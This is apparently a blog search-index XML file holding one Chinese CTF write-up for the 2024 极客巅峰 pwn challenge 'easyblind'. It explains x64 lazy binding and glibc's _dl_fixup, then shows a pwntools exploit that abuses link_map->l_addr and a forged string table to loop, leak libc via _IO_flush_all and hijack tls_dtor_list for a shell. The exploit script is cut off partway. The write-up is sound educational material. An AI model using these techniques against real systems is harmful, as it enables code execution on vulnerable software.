<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024极客巅峰pwn</title>
    <link href="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
    <url>/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="2024极客巅峰pwn"><a href="#2024极客巅峰pwn" class="headerlink" title="2024极客巅峰pwn"></a><center>2024极客巅峰pwn</h1><h2 id="easyblind"><a href="#easyblind" class="headerlink" title="easyblind"></a>easyblind</h2><p>赛后根据这篇博客做出来了，<a href="https://csc8.github.io/2023/04/06/qwarmup/#%E7%9F%A5%E8%AF%86%E7%82%B9">强网杯qwarmup - Csc8_Blog</a></p><p>首先来补充一些基础知识(x64elf文件的动态链接过程)</p><h3 id="什么是动态链接"><a href="#什么是动态链接" class="headerlink" title="什么是动态链接"></a>什么是动态链接</h3><p>​随着系统中的可执行文件的增加，静态链接带来的磁盘和内存空间的浪费也就越来越严重，例如：大部分的可执行文件都是需要glibc，那么静态链接就会把libc.a(静态链接库)和编写的代码链接进去，试想一下，一个libc.a的大小为5M左右，那么1000个就是5G，并且在装载入内存中时也是如此，如果两个文件链接了相同的.a文件，那么内存都会装载一次，造成重复，所以就有了动态链接，将系统库和自己所编写的代码分割成两个独立的模块，等到程序运行的时候再将这两个模块链接起来，这样即节省了硬盘空间，也节省了内存空间。</p><h3 id="延时绑定"><a href="#延时绑定" class="headerlink" title="延时绑定"></a>延时绑定</h3><p>​当程序在linux中执行时，他不能准确的定位到库中的函数，这时就需要动态链接器去解析对库中符号的引用，而解析符号的过程就称为延时绑定，这也是本题的主要攻击手段</p><h3 id="demo演示"><a href="#demo演示" class="headerlink" title="demo演示"></a>demo演示</h3><p>​首先来看看延时绑定的一个过程，这里演示用的版本是glibc2.31</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/1.png" class=""><p></p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2.png" class=""><p>​这里我们可以看到，由于是第一次调用printf函数，此时libc地址还并没有写入got表中</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/3.png" class=""><p>​而这个位置可以看到他有两个push指令，其中0就代表reloc_arg，而另外一个则是link_map，最后进入了_dl_runtime_resolve_xsavec函数中</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/4.png" class=""><p>​接着往下看会发现它实际上是将push的两个参数传入_dl_fixup函数中</p><p>在分析_dl_fixup函数之前，这里要介绍一下三个重要的部分</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-type">JMPREL</span>(.rela.plt)：<br>它由<span class="hljs-number">0x18</span>字节对齐的<span class="hljs-type">ELF64_Rel</span>结构体构成<br>typedef struct&#123;<br><span class="hljs-type">Elf64_Addr</span>  r_offset;<br><span class="hljs-type">Elf64_Word</span>r_info;<br><span class="hljs-type">Elf64_Sxword</span> r_addend;        /* <span class="hljs-type">Addend</span> */<br>&#125;<span class="hljs-type">Elf64_Rela</span>;<br>r_offset:包含存储已解析符号的地址的位置（在 <span class="hljs-type">GOT</span> 中）<br>r_info：表示重定位类型，作为符号表索引。它将用于在 <span class="hljs-type">DYNSYM</span> 部分中定位相应的 <span class="hljs-type">Elf64_Sym</span> 结构<br><br><span class="hljs-type">DYNSYM</span> (.dynsym)：<br>包含一个符号表。它由 <span class="hljs-number">0x18</span> 字节对齐的<br>typedef struct&#123;<br><span class="hljs-type">Elf64_Word</span>st_name;<br>unsigned char st_info;<br>unsigned charst_other;<br><span class="hljs-type">Elf64_Section</span>   st_shndex;<br><span class="hljs-type">Elf64_Addr</span> st_value;<br><span class="hljs-type">Elf64_Xword</span>     st_size;<br>&#125;<span class="hljs-type">Elf64_Sym</span>;<br>st_name：它充当字符串表索引。它将用于在 <span class="hljs-type">STRTAB</span> 部分中定位正确的字符串。<br>st_info：它包含符号的类型和绑定属性。<br>st_other：包含符号的可见性。<br>st_shndx：包含相关的节头表索引。<br>st_value：它包含关联符号的值。<br>st_size：它包含符号的大小。如果符号没有大小或大小未知，则它包含 <span class="hljs-number">0</span>。<br><br><span class="hljs-type">STRTAB</span> (.dynstr)：<br>存放函数字符串名<br></code></pre></td></tr></table></figure><p>​好的接下来就进入最折磨的源码分析环节</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs xl">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg) <span class="hljs-comment">// 第一个参数link_map，也就是got[1]</span><br>&#123;<br>    <span class="hljs-comment">// 获取link_map中存放DT_SYMTAB的地址</span><br>  const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);<br>    <span class="hljs-comment">// 获取link_map中存放DT_STRTAB的地址</span><br>  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);<br>    <span class="hljs-comment">// reloc_offset就是reloc_arg,获取重定位表项中对应函数的结构体</span><br>  const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>    <span class="hljs-comment">// 根据重定位结构体的r_info得到symtab表中对应的结构体</span><br>  <span class="hljs-function"><span class="hljs-title">const</span> ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;</span>r_info)];<br>  <br>  <span class="hljs-function"><span class="hljs-title">void</span> *const rel_addr = (void *)(l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_addr</span> + reloc-&gt;</span>r_offset);<br>  lookup_t result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span><br>  <span class="hljs-function"><span class="hljs-title">assert</span> (ELFW(R_TYPE)(reloc-&gt;</span>r_info) == ELF_MACHINE_JMP_SLOT); <span class="hljs-comment">// 检查r_info的最低位是不是7</span><br><br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br>  <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;</span>st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">// 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码</span><br>    &#123;<br>      const struct r_found_version *version = NULL;<br>         <span class="hljs-comment">// 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码</span><br>      <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_info[VERSYMIDX (DT_VERSYM)] != NULL)<br>        &#123;<br>          <span class="hljs-comment">// 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff的过程中，由于我们一般伪造的symtab位于bss段</span><br>          <span class="hljs-comment">// 就导致在64位下reloc-&gt;r_info比较大,故程序会发生错误。所以要使程序不发生错误，自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段</span><br>          <span class="hljs-comment">// 第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。</span><br>          <span class="hljs-comment">// 第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。</span><br>          const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>          E<span class="hljs-function"><span class="hljs-title">lfW</span>(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;</span>r_info)] &amp; <span class="hljs-number">0</span>x7fff;<br>          <span class="hljs-function"><span class="hljs-title">version</span> = &amp;l-&gt;</span>l_versions[ndx];<br>          <span class="hljs-function"><span class="hljs-title">if</span> (version-&gt;</span>hash == <span class="hljs-number">0</span>)<br>            version = NULL;<br>        &#125;<br><br>      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><br><span class="hljs-comment">     not necessary for objects which cannot be unloaded or when</span><br><span class="hljs-comment">     we are not using any threads (yet).  */</span><br>      int flags = DL_LOOKUP_ADD_DEPENDENCY;<br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>        &#123;<br>          THREAD_GSCOPE_SET_FLAG ();<br>          flags |= DL_LOOKUP_GSCOPE_LOCK;<br>        &#125;<br><br>      RTLD_ENABLE_FOREIGN_CALL;<br>    <span class="hljs-comment">// 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br>      <span class="hljs-function"><span class="hljs-title">result</span> = _dl_lookup_symbol_x (strtab + sym-&gt;</span><span class="hljs-function"><span class="hljs-title">st_name</span>, l, &amp;sym, l-&gt;</span>l_scope,<br>                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);<br><br>      <span class="hljs-comment">/* We are done with the global scope.  */</span><br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>    THREAD_GSCOPE_RESET_FLAG ();<br><br>      RTLD_FINALIZE_FOREIGN_CALL;<br><br>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment">     of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment">     offset.  */</span><br>      <span class="hljs-comment">// 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value</span><br>      <span class="hljs-function"><span class="hljs-title">value</span> = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;</span>st_value) : <span class="hljs-number">0</span>);<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123; <br>      <span class="hljs-comment">// 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l-&gt;l_addr + st_value</span><br>      <span class="hljs-comment">// 我们的目的是使value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value</span><br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment">     address) is also known.  */</span><br>      <span class="hljs-function"><span class="hljs-title">value</span> = DL_FIXUP_MAKE_VALUE (l, l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_addr</span> + sym-&gt;</span>st_value);<br>      result = l;<br>    &#125;<br><br>  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != NULL<br>      &amp;&amp; __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (ELFW(ST_TYPE) (sym-&gt;</span>st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    return value;<br>  <span class="hljs-comment">// 最后把value写入相应的GOT表条目中</span><br>  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);<br>&#125;<br><span class="hljs-comment">//来自 https://blog.csdn.net/qq_51868336/article/details/114644569</span><br></code></pre></td></tr></table></figure><p>​根据源码我们就知道了.rel.plt 、.dynsym、.dynstr 段的地址都是从 l -&gt; l_info[] 中取的，所以 l -&gt; l_info 又对应了 .dynamic 段，这里我们可以在 IDA 看到 .dynamic 段的内容</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/5.png" class=""><p>​如果是ret2dlresolve手法的话，这里的总结就是</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl">st_other != <span class="hljs-number">0</span><br><br><span class="hljs-function"><span class="hljs-title">l</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">l_addr</span> = system_libc - a_libc；sym -&gt;</span> st_value = a_got （其中，a 函数是已经被解析过的一个函数）<br></code></pre></td></tr></table></figure><p>ok，接着就可以回到这道题本身了</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/6.png" class=""><p>​题目分析可知就是一次地址任意写一字节的操作，但是这里要注意，他这里的程序本身不是写在main函数中的，而是在main函数之前就开始执行了</p><p>​如果绕过了_Exit函数去调试会发现程序执行完main函数后最后会进入</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/7.png" class=""><p>​然后循环执行函数，其中</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/8.png" class=""><p>​这里的题目函数就在这个第二个，所以我们的首要目标就是拥有无限循环，这里的条件只需绕过_Exit函数即可。</p><h3 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h3><p>​这里绕过也很简单，我们利用延时绑定的机制，将原本要写入wirte函数的libc地址改为写入到_Exit即可，前面的源码分析中也写到了是通过link_map-&gt;l_addr来确定函数回填的地址的</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/9.png" class=""><p>​那这里我们将link_map-&gt;l_addr修改，使得修改后的地址写入_Exit的got位置，这样即可绕过_Exit，也因为地址是写入的_Exit的got，从而导致write的got表地址没变，下次循环时又要进入延时绑定的函数，如此循环</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/10.png" class=""><p>​现在有了无限一字节修改内存的办法，那么现在就可以想着去泄露libc基地址了，这里就可以利用_IO_flush_all去刷新IO流，刷新两次，第一次先将libc的地址留在_IO_write_ptr中，第二次就可以泄露处libc基地址了，那么想要利用_IO_flush_all去刷新IO流，首先必要的就是能够使用_IO_flush_all函数，前面也提过是通过函数字符串名来定位的libc函数，那么我们便可以去伪造这一部分，但这里前提要注意一点的是，由于题目只提供了与libc的偏移，所以我们想办法在libc的偏移内去修改这一范围</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/11.png" class=""><p>​也就是说他这里原本是通过0x3e78存放的值去定位函数字符串的</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/12.png" class=""><p>​并且他是通过link_map中的l_info去赋值的，所以他是存在于libc上的一个的一个地址，那么就是我们可以修改的，根据这个博客作者的描述，这里也是给我们找了一个用于修改的位置，也就是我画横线的DT_DEBUG处，至于其中的定位字符串的偏移，这里得通过调试去得知，我们先修改link_map上的地址原本为STRTAB的地方为DT_DEBUG</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/13.png" class=""><p></p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/14.png" class=""><p>​可以看到由于我们修改为了DT_DEBUG，那么他就会_r_debug的位置作为去查找函数值的一个基地址，同时可以看到这里是加上了0x3e来查找</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/15.png" class=""><p>​对于的代码就是此处，OK，那我们就知道此处的偏移，开始修改</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">stdout</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>lss(<span class="hljs-string">&#x27;stdout&#x27;</span>)<br>write_all(<span class="hljs-keyword">stdout</span>,p32(<span class="hljs-number">0xfbad3887</span>))   <span class="hljs-comment">#_flags</span><br>write_all(<span class="hljs-keyword">stdout</span>+<span class="hljs-number">0x28</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>)  <span class="hljs-comment">#_IO_write_ptr</span><br>lss(<span class="hljs-string">&#x27;link_map&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write_all(ld_base+ld.symbols[<span class="hljs-string">&#x27;_r_debug&#x27;</span>]+<span class="hljs-number">0x3e</span>,b<span class="hljs-string">&#x27;_IO_flush_all\x00&#x27;</span>)<br><br>dbg(<span class="hljs-string">&#x27;b *$rebase(0x01219)&#x27;</span>)<br><span class="hljs-built_in">write</span>(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0xb8</span>) <span class="hljs-comment"># start flush</span><br><span class="hljs-built_in">write</span>(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0x78</span>) <span class="hljs-comment"># stop flush</span><br><br>write_all(<span class="hljs-keyword">stdout</span>,p32(<span class="hljs-number">0xfbad1800</span>))   <span class="hljs-comment">#_flags</span><br>write_all(<span class="hljs-keyword">stdout</span>+<span class="hljs-number">0x28</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>)  <span class="hljs-comment">#_IO_write_ptr</span><br></code></pre></td></tr></table></figure><p>​这里先修改stdout中的数据，先打上标记，至于为何这么做呢，且看</p><img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/16.png" class=""><p>​因为不先刷新一次的话，这里是不会存在libc的地址，就导致我们无法只能通过修改一个字节来达到泄露地址的目的，得先将flags值和_IO_write_ptr改了后才能将libc的地址挂下，至于为何这么做，请看源码</p><p>​为了满足这些条件</p><p>​之后将libc地址挂上后就直接修改就好了，之后的内容就多样性了，由于我们以及知道如何修改字符串来调用相关函数，那我们就可以通过修改来使_Exit来执行各种函数，由于不能控制rdi，那就可以控制其为exit走IO等能劫持shell的函数即可，这里我就不多描述了，有了libc基地址和地址任意改的能力，这不随便秒，我这里最后走的是tls_dtor_list，别问为啥不走house of cat，问就是我懒，走这个可以少打点代码</p><p>最终exp如下，下班</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>  <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span> ,<span class="hljs-string">&quot;split&quot;</span> ,<span class="hljs-string">&quot;-h&quot;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(file)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)  <br>ld = ELF(<span class="hljs-string">&#x27;./ld-2.31.so&#x27;</span>)  <br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug 